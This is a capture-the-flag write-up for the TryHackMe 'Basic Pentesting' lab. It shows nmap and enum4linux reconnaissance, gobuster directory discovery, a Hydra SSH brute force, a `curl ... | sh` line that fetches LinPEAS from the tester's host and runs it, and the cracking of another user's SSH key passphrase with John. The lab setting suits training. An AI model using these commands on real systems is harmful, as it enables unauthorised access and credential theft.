# Basic Pentesting
#### Web App Testing and Privilege Escalation
#### [Room Link](1)

In this created by @ashu is the perfect starting point for all those looking to get into pentesting. It shows off some of the basic tools needed and relies on a basic knowledge of Linux to be able to navigate these typical paths.


## Tasks
##### 1. Deploy the Machine and connect to our network
  This is a simple challenge that you should know from having explored the site already. If you are having trouble go to the Access page [here](2) to get help with download & setup of your VPN setup.
##### 2. Find the services exposed by the machine
  This is where the basics of recon come into play. I personally use [nmap][3] which is default on the Kali 2020.1 install I have. We start with a basic
  ` nmap -sV -sC -Pn -oN webapp_basic.txt [webappIP] `
  This nmap is commonly used by [Ippsec](4) and I have incorporated it into my setup as well. the -sV probes all open ports it finds to determine if we can get the service/version information. the -sC flag runs scripts against open ports as well to determine if there are external/common vulnerabilities that we can use outright. -Pn disables host discovery, since we know the machine is online we dont have to verify that in nmap. -oN outputs the output of the nmap scan into a normal format so you have it for future use.
  In our NMAP results we get
  ```
  # Nmap 7.80 scan initiated Tue Mar 17 09:18:13 2020 as: nmap -sV -sC -Pn -oN webapp_basic.txt 10.10.182.247
Nmap scan report for 10.10.182.247
Host is up (0.14s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods:
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http        Apache Tomcat 9.0.7
|_http-title: Apache Tomcat/9.0.7
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m00s, deviation: 2h18m33s, median: 0s
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2020-03-17T09:18:56-04:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-03-17T13:18:56
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Mar 17 09:19:00 2020 -- 1 IP address (1 host up) scanned in 47.78 seconds
  ```
  Through this we see that there is a web site to look into at port 80. In the meantime, we always want more automated scan running in the background so lets throw enum4linux at it to see what we get while we manually explore the web server.
  Running enum4linux via
  ` enum4linux -a [webappIP] > enum.txt`
  lets us send the output to a text file to review later if needed.
##### 3. What is the name of the hidden directory on the web server?
  Knowing we have a webserver lets open up a browser and take a look first. With a basic "Ongoing Maintenance" page we open the source to find
  ``` HTML
  <html>

  <h1>Undergoing maintenance</h1>

  <h4>Please check back later</h4>
  <!-- Check our dev note section if you need to know what to work on. -->

  </html>
  ```
  We see there is a dev notes section somewhere so lets break out our domain enumeration tool to see what is public facing! Gobuster is my go-to enum tool, the setup instructions for it can be found [here](5). (It does require setting up a Go environment which I recommend)
  `gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://[webappIP]`
  After running for only a little bit, here we get a result sounding exactly what we think.
  ```
  ===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            [webappIP]
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/03/17 12:33:35 Starting gobuster
===============================================================
/development (Status: 301)
Progress: 765 / 87665 (0.87%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/03/17 12:33:48 Finished
===============================================================
  ```
When we go to that site we get these files.

![development_directory][6]

in dev.txt we get
```

2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```
This corresponds to what we saw in the nmap scan with the Apache version and SMB being available.
In j.txt
```
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
```
So seeing that information we know what to look for with J & K in bruteforcing.

##### 4. User brute-forcing to find the username & password
###### 5. What is the username?
###### 6. What is the password?
Lets give a look at the enum4Linux script to see what we have available.  Scrolling down to enumerating users we see this:
```
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)
```
Luckily that gives us a user (jan) to then bruteforce. I know from different resources that Hydra is a good resource to crack SSH with wordlists. I also use [SecLists](7) here as it has more options than the regular rockyou.txt
`hydra -l jan -P /usr/share/wordlists/SecLists/Passwords/darkweb2017-top10000.txt [webappIP] ssh
`
After running for a bit we get the output
```
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-03-17 15:52:16
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 9999 login tries (l:1/p:9999), ~625 tries per task
[DATA] attacking ssh://10.10.68.148:22/
[STATUS] 178.00 tries/min, 178 tries in 00:01h, 9823 to do in 00:56h, 16 active
[STATUS] 119.33 tries/min, 358 tries in 00:03h, 9643 to do in 01:21h, 16 active
[STATUS] 116.86 tries/min, 818 tries in 00:07h, 9183 to do in 01:19h, 16 active
[STATUS] 113.20 tries/min, 1698 tries in 00:15h, 8303 to do in 01:14h, 16 active
[22][ssh] host: 10.10.68.148   login: jan   password: [REDACTED]
1 of 1 target successfully completed, 1 valid password found
```
##### 7. What service do you use to access the server
Perfect! We now have a login for ssh to do.
`ssh jan@[webappIP]`
We enter the password we found above and get the login prompt!

##### 8. Enumerate the machine to find any vectors for privilege escalation
One of the enumeration scripts that I have liked is [PEASS](8) that color code different things so we can tell what to check out. To get LinPEAS.sh over to the webapp we use `python -m SimpleHTTPServer 5455` on our host machine with LinPEAS.sh in our current directory. With the ssh session we use `curl [vpnhostIP]/linpeas.sh | sh`

After running that we see in LinPeas.sh that we have a vulnerable path.
```
[+] Files inside others home (limit 20)
/home/kay/.profile                                                                                 
/home/kay/.viminfo
/home/kay/.bashrc
/home/kay/.bash_history
/home/kay/.lesshst
/home/kay/.ssh/authorized_keys
/home/kay/.ssh/id_rsa
/home/kay/.ssh/id_rsa.pub
/home/kay/.bash_logout
/home/kay/.sudo_as_admin_successful
/home/kay/pass.bak
```
So we see id_rsa & id_rsa.pub in kay's folder which corresponds to the other user possible. And with the pass.bak we can guess that it has kay's password in it.

##### 9. 	What is the name of the other user you found?
Checking out that directory we look at the file perms and see that we can access the ssh key!
```
jan@basic2:/home/kay$ ls -la
total 48
drwxr-xr-x 5 kay  kay  4096 Apr 23  2018 .
drwxr-xr-x 4 root root 4096 Apr 19  2018 ..
-rw------- 1 kay  kay   756 Apr 23  2018 .bash_history
-rw-r--r-- 1 kay  kay   220 Apr 17  2018 .bash_logout
-rw-r--r-- 1 kay  kay  3771 Apr 17  2018 .bashrc
drwx------ 2 kay  kay  4096 Apr 17  2018 .cache
-rw------- 1 root kay   119 Apr 23  2018 .lesshst
drwxrwxr-x 2 kay  kay  4096 Apr 23  2018 .nano
-rw------- 1 kay  kay    57 Apr 23  2018 pass.bak
-rw-r--r-- 1 kay  kay   655 Apr 17  2018 .profile
drwxr-xr-x 2 kay  kay  4096 Apr 23  2018 .ssh
-rw-r--r-- 1 kay  kay     0 Apr 17  2018 .sudo_as_admin_successful
-rw------- 1 root kay   538 Apr 23  2018 .viminfo
jan@basic2:/home/kay$ cd .ssh
jan@basic2:/home/kay/.ssh$ ls -la
total 20
drwxr-xr-x 2 kay kay 4096 Apr 23  2018 .
drwxr-xr-x 5 kay kay 4096 Apr 23  2018 ..
-rw-rw-r-- 1 kay kay  771 Apr 23  2018 authorized_keys
-rw-r--r-- 1 kay kay 3326 Apr 19  2018 id_rsa
-rw-r--r-- 1 kay kay  771 Apr 19  2018 id_rsa.pub
```

Unfortunately when we try to ssh using the key file we see the key requires a password.
```
jan@basic2:/home/kay/.ssh$ ssh -i id_rsa kay@127.0.0.1
Enter passphrase for key 'id_rsa':
```
But luckily we can cat out this file and crack the key with [JohnTheRipper](9)

Using `ssh2john.py id_rsa > john_id_rsa.hash` we get a john-crackable file that we can start here. `john --wordlist=/usr/share/wordlists/rockyou.txt john_id_rsa.hash`

But it quickly finds the password for the key file
```
[REDACTED]         (kay_id_rsa)
```
 Trying again with the ssh file we easily log in with the file password and get the pass.bak!

##### 10. If you have found another user, what can you do with this information?
Since there isnt a flag for this we can only think about the possible information we could do. Using an additional user we could see if it was part of any groups in `/etc/groups` or have programs that you can sudo `Check with sudo -l` . It truly depends on what is configured on a machine, but running something like LinPeas.sh will give you a good starting point!

##### 11. What is the final password you obtain?
 That contains our final flags!

![KayUserProof][10]

[1]: https://tryhackme.com/room/basicpentesting
[2]: https://tryhackme.com/access
[3]: https://nmap.org/
[4]: https://ippsec.rocks/#
[5]: https://github.com/OJ/gobuster
[6]: https://raw.githubusercontent.com/gwagstaff/CTF-Write-Ups/master/TryHackMe/Basic_Webapp/resources/webapp_80_files.png
[7]: https://github.com/danielmiessler/SecLists
[8]: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
[9]: https://github.com/magnumripper/JohnTheRipper
[10]: https://raw.githubusercontent.com/gwagstaff/CTF-Write-Ups/master/TryHackMe/Basic_Webapp/resources/webapp_ssh_kay.png
